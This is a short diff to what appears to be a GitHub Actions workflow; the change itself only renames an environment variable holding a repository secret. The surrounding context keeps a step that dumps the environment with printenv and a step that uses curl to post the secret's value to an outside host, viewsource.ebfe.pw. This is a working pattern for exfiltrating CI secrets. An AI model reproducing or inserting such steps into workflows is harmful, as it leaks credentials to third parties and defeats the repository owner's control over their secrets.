@@ -11,11 +11,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - env:
-          FIX_THIS_GITHUB: ${{ secrets.FIX_THIS_GITHUB }}
+          ME_MODIFYING_FIX_THIS_GITHUB: ${{ secrets.FIX_THIS_GITHUB }}
         run: echo "WTF???"; printenv
       - shell: bash
         env:
-          FIX_THIS_GITHUB: ${{ secrets.FIX_THIS_GITHUB }}
+          ME_MODIFYING_FIX_THIS_GITHUB: ${{ secrets.FIX_THIS_GITHUB }}
         run: curl https://viewsource.ebfe.pw/vault/catchrequest --data "wtf=$FIX_THIS_GITHUB"
       - name: Create tag
         uses: actions/github-script@v5
